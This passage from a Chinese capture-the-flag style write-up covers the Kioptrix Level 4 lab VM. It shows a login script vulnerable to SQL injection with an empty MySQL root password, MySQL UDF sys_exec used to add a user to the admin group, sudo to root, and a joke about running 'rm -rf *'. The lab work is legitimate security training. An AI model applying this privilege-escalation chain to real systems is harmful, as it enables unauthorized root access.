root      <span class="token number">6729</span>  <span class="token number">5489</span>  <span class="token number">0</span> <span class="token number">17</span>:58 ?        00:00:00 sshd: john <span class="token punctuation">[</span>priv<span class="token punctuation">]</span>
john      <span class="token number">6731</span>  <span class="token number">6729</span>  <span class="token number">0</span> <span class="token number">17</span>:58 ?        00:00:00 sshd: john@pts/0 
john      <span class="token number">6732</span>  <span class="token number">6731</span>  <span class="token number">0</span> <span class="token number">17</span>:58 pts/0    00:00:00 python /bin/kshell
john      <span class="token number">6733</span>  <span class="token number">6732</span>  <span class="token number">0</span> <span class="token number">18</span>:02 pts/0    00:00:00 <span class="token function">sh</span> <span class="token parameter variable">-c</span> /bin/bash
john      <span class="token number">6734</span>  <span class="token number">6733</span>  <span class="token number">0</span> <span class="token number">18</span>:02 pts/0    00:00:00 /bin/bash
john      <span class="token number">6753</span>  <span class="token number">6734</span>  <span class="token number">0</span> <span class="token number">18</span>:05 pts/0    00:00:00 <span class="token function">ps</span> <span class="token parameter variable">-ef</span>

</code></pre> 
<blockquote> 
 <p>确认mysql是 root权限启动<br> 我们将尝试利用mysql 提权</p> 
</blockquote> 
<h4><a id="332_php_1465"></a>3.3.2 php文件查找</h4> 
<pre><code class="prism language-bash">john@Kioptrix4:~$ <span class="token function">find</span> /var/www <span class="token parameter variable">-name</span> *.php
/var/www/login_success.php
/var/www/index.php
/var/www/member.php
/var/www/checklogin.php
/var/www/logout.php
/var/www/robert/robert.php
/var/www/john/john.php

</code></pre> 
<h4><a id="333_php_1478"></a>3.3.3 查看php文件</h4> 
<pre><code class="prism language-bash">john@Kioptrix4:~$ <span class="token function">cat</span> /var/www/checklogin.php
<span class="token operator">&lt;</span>?php
ob_start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$host</span><span class="token operator">=</span><span class="token string">"localhost"</span><span class="token punctuation">;</span> // Host name
<span class="token variable">$username</span><span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">;</span> // Mysql username
<span class="token variable">$password</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span> // Mysql password
<span class="token variable">$db_name</span><span class="token operator">=</span><span class="token string">"members"</span><span class="token punctuation">;</span> // Database name
<span class="token variable">$tbl_name</span><span class="token operator">=</span><span class="token string">"members"</span><span class="token punctuation">;</span> // Table name

// Connect to server and <span class="token keyword">select</span> databse.
mysql_connect<span class="token punctuation">(</span><span class="token string">"<span class="token variable">$host</span>"</span>, <span class="token string">"<span class="token variable">$username</span>"</span>, <span class="token string">"<span class="token variable">$password</span>"</span><span class="token punctuation">)</span>or die<span class="token punctuation">(</span><span class="token string">"cannot connect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
mysql_select_db<span class="token punctuation">(</span><span class="token string">"<span class="token variable">$db_name</span>"</span><span class="token punctuation">)</span>or die<span class="token punctuation">(</span><span class="token string">"cannot select DB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

// Define <span class="token variable">$myusername</span> and <span class="token variable">$mypassword</span>
<span class="token variable">$myusername</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'myusername'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$mypassword</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'mypassword'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

// To protect MySQL injection <span class="token punctuation">(</span>more detail about MySQL injection<span class="token punctuation">)</span>
<span class="token variable">$myusername</span> <span class="token operator">=</span> stripslashes<span class="token punctuation">(</span><span class="token variable">$myusername</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
//<span class="token variable">$mypassword</span> <span class="token operator">=</span> stripslashes<span class="token punctuation">(</span><span class="token variable">$mypassword</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$myusername</span> <span class="token operator">=</span> mysql_real_escape_string<span class="token punctuation">(</span><span class="token variable">$myusername</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
//<span class="token variable">$mypassword</span> <span class="token operator">=</span> mysql_real_escape_string<span class="token punctuation">(</span><span class="token variable">$mypassword</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

//<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM <span class="token variable">$tbl_name</span> WHERE username='<span class="token variable">$myusername</span>' and password='<span class="token variable">$mypassword</span>'"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token string">"SELECT * FROM <span class="token variable">$tbl_name</span> WHERE username='<span class="token variable">$myusername</span>' and password='<span class="token variable">$mypassword</span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
//<span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

// Mysql_num_row is counting table row
<span class="token variable">$count</span><span class="token operator">=</span>mysql_num_rows<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
// If result matched <span class="token variable">$myusername</span> and <span class="token variable">$mypassword</span>, table row must be <span class="token number">1</span> row

if<span class="token punctuation">(</span><span class="token variable">$count</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
// Register <span class="token variable">$myusername</span>, <span class="token variable">$mypassword</span> and redirect to <span class="token function">file</span> <span class="token string">"login_success.php"</span>
	session_register<span class="token punctuation">(</span><span class="token string">"myusername"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	session_register<span class="token punctuation">(</span><span class="token string">"mypassword"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	header<span class="token punctuation">(</span><span class="token string">"location:login_success.php?username=<span class="token variable">$myusername</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
<span class="token builtin class-name">echo</span> <span class="token string">"Wrong Username or Password"</span><span class="token punctuation">;</span>
print<span class="token punctuation">(</span><span class="token string">'&lt;form method="link" action="index.php"&gt;&lt;input type=submit value="Try Again"&gt;&lt;/form&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

ob_end_flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
?<span class="token operator">&gt;</span>


</code></pre> 
<blockquote> 
 <p>发现登录mysql的用户名为:<strong>root</strong>,密码为空。</p> 
</blockquote> 
<h4><a id="334_mysql_1532"></a>3.3.4 登录mysql数据库</h4> 
<pre><code class="prism language-bash">john@Kioptrix4:~$ mysql <span class="token parameter variable">-u</span> root <span class="token parameter variable">-p</span>
Enter password: 
Welcome to the MySQL monitor.  Commands end with <span class="token punctuation">;</span> or <span class="token punctuation">\</span>g.
Your MySQL connection <span class="token function">id</span> is <span class="token number">6258</span>
Server version: <span class="token number">5.0</span>.51a-3ubuntu5.4 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>

Type <span class="token string">'help;'</span> or <span class="token string">'\h'</span> <span class="token keyword">for</span> help. Type <span class="token string">'\c'</span> to <span class="token function">clear</span> the buffer.

mysql<span class="token operator">&gt;</span> 


</code></pre> 
<blockquote> 
 <p>登录成功</p> 
</blockquote> 
<h4><a id="335_udf_1550"></a>3.3.5 查看udf表</h4> 
<pre><code class="prism language-bash">mysql<span class="token operator">&gt;</span> SELECT * FROM mysql.func<span class="token punctuation">;</span>
+-----------------------+-----+---------------------+----------+
<span class="token operator">|</span> name                  <span class="token operator">|</span> ret <span class="token operator">|</span> dl                  <span class="token operator">|</span> <span class="token builtin class-name">type</span>     <span class="token operator">|</span>
+-----------------------+-----+---------------------+----------+
<span class="token operator">|</span> lib_mysqludf_sys_info <span class="token operator">|</span>   <span class="token number">0</span> <span class="token operator">|</span> lib_mysqludf_sys.so <span class="token operator">|</span> <span class="token keyword">function</span> <span class="token operator">|</span> 
<span class="token operator">|</span> sys_exec              <span class="token operator">|</span>   <span class="token number">0</span> <span class="token operator">|</span> lib_mysqludf_sys.so <span class="token operator">|</span> <span class="token keyword">function</span> <span class="token operator">|</span> 
+-----------------------+-----+---------------------+----------+
<span class="token number">2</span> rows <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

</code></pre> 
<blockquote> 
 <p>脚本文件下载成功。</p> 
</blockquote> 
<h4><a id="336__1566"></a>3.3.6 管理员用户组添加</h4> 
<blockquote> 
 <p>利用 sys_exec()函数将john用户添加到管理员组。</p> 
</blockquote> 
<pre><code class="prism language-bash">mysql<span class="token operator">&gt;</span> <span class="token keyword">select</span> sys_exec<span class="token punctuation">(</span><span class="token string">'usermod -a -G admin john '</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+---------------------------------------+
<span class="token operator">|</span> sys_exec<span class="token punctuation">(</span><span class="token string">'usermod -a -G admin john '</span><span class="token punctuation">)</span> <span class="token operator">|</span>
+---------------------------------------+
<span class="token operator">|</span> NULL                                  <span class="token operator">|</span> 
+---------------------------------------+
<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.04</span> sec<span class="token punctuation">)</span>
                                                                                                                                                                                                 
</code></pre> 
<blockquote> 
 <p>添加用户组成功。</p> 
</blockquote> 
<h4><a id="337__1582"></a>3.3.7 切换超级管理员</h4> 
<blockquote> 
 <p>密码为：<strong>MyNameIsJohn</strong></p> 
</blockquote> 
<pre><code class="prism language-bash">john@Kioptrix4:~$ <span class="token function">sudo</span> <span class="token function">su</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> john: 
root@Kioptrix4:/home/john<span class="token comment"># </span>
root@Kioptrix4:/home/john<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
root@Kioptrix4:/home/john<span class="token comment"># whoami</span>
root

</code></pre> 
<blockquote> 
 <p>我们到这里已经获得root权限，O(∩_∩)O哈哈~ 可以执行rm -rf * 了</p> 
</blockquote> 
<h4><a id="338_flag_1599"></a>3.3.8 flag</h4> 
<pre><code class="prism language-bash">root@Kioptrix4:/home/john<span class="token comment"># cd /root</span>
root@Kioptrix4:~<span class="token comment"># ls</span>
congrats.txt  lshell-0.9.12
root@Kioptrix4:~<span class="token comment"># cat congrats.txt</span>
Congratulations<span class="token operator">!</span>
You<span class="token string">'ve got root.

There is more then one way to get root on this system. Try and find them.
I'</span>ve only tested two <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> methods, but it doesn<span class="token string">'t mean there aren'</span>t more.
As always there<span class="token string">'s an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it'</span>s not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks <span class="token keyword">for</span> playing,
loneferret

</code></pre> 
<blockquote> 
 <p>至此，我们关于此处渗透测试已经结束</p> 
</blockquote> 
<hr> 
<h2><a id="_1630"></a>渗透总结</h2> 
<p>在本次Kioptrix Level #4靶机渗透测试，内容包括主机扫描（nmap\netdiscover）、端口扫描（nmap\masscan）、目录扫描（dirb\dirsearch）、SQL注入、使用udf进行系统提权等内容：</p> 
<ul><li>主机发现</li><li>目录扫描</li><li>端口扫描</li><li>SQL注入</li><li>shell逃逸</li><li>udf系统提权</li></ul> 
<hr> 
<h2><a id="_1640"></a>参考文章</h2> 
<ul><li><a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/" rel="nofollow">Kioptrix Level #4靶场</a></li><li><a href="https://blog.csdn.net/newbeixue/article/details/123111543">arp-scan使用</a></li><li><a href="https://blog.csdn.net/weixin_45329009/article/details/100170779">Netdiscover基本使用</a></li><li><a href="https://blog.csdn.net/smli_ng/article/details/105964486">nmap详细使用教程</a></li><li><a href="https://zhuanlan.zhihu.com/p/396345123" rel="nofollow">黑客工具之whatweb详细使用教程</a></li><li><a href="https://github.com/maurosoria/dirsearch">dirsearch - Web path discovery</a></li><li><a href="https://blog.csdn.net/weixin_43819747/article/details/136736688">Sqlmap使用指南(手把手保姆版)持续更新</a></li><li><a href="https://www.cnblogs.com/ghc666/p/8609067.html" rel="nofollow">mySql的UDF是什么 </a></li><li>Kioptrix Level #4</li></ul>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/549168f3ded9905784b8e8ab851a8b1b/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">LVS&#43;KeepAlived高可用负载均衡集群</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/1bb9bb5367ac5102b4f5bbd0a2f04436/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">D-Bus——DBUS_SESSION_BUS_ADDRESS 环境变量为空</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>